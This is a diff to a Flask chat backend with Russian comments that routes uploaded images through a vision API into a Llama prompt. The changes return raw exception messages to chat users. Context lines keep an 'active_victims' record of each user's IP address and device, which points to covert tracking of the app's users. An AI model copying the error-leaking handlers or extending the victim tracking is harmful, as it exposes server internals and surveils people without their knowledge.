@@ -1,5 +1,5 @@
 from flask import Flask, request, jsonify, render_template_string, send_from_directory
-import random, os, urllib.request, json, time, base64
+import random, os, urllib.request, json, time, base64, traceback
 
 app = Flask(__name__)
 
@@ -809,11 +809,9 @@ def chat_api():
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
 
-        # Если есть картинка, задействуем Gemini для описания сцены
         image_description = ""
         if img_data:
             try:
-                # Очищаем base64 от префикса data:image/...;base64,
                 if "," in img_data:
                     img_base64 = img_data.split(",")[1]
                     img_mime = img_data.split(",")[0].split(":")[1].split(";")[0]
@@ -852,12 +850,15 @@ def chat_api():
                     res_g = json.loads(resp.read().decode("utf-8"))
                     image_description = res_g["choices"][0]["message"]["content"]
             except Exception as e:
-                image_description = "[Не удалось проанализировать изображение]"
+                # ВЫВОДИМ ОШИБКУ В ОТВЕТ ЧАТОМ ДЛЯ ОТЛАДКИ
+                import traceback
+                err_details = traceback.format_exc()
+                print("GEMINI ERROR:", err_details)
+                image_description = f"[Ошибка Gemini API: {str(e)}]"
 
-        # Формируем итоговый промпт для Llama
         final_user_input = user_msg
         if image_description:
-            final_user_input = f"[Пользователь прикрепил изображение. Подробное описание сцены от视觉-анализатора: {image_description}]\nВопрос/комментарий пользователя: {user_msg}"
+            final_user_input = f"[Пользователь прикрепил изображение. Описание: {image_description}]\nВопрос пользователя: {user_msg}"
 
         reply = ""
         system_prompt = (
@@ -917,7 +918,4 @@ def chat_api():
 
         return jsonify({"reply": reply, "chat_id": chat_id, "trigger_sound": trigger_sound})
     except Exception as e:
-        return jsonify({"reply": "Произошла внутренняя ошибка сервера.", "chat_id": chat_id if 'chat_id' in locals() else ""})
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+        return jsonify({"reply": f"Ошибка сервера: {str(e)}", "chat_id": chat_id if 'chat_id' in locals() else ""})
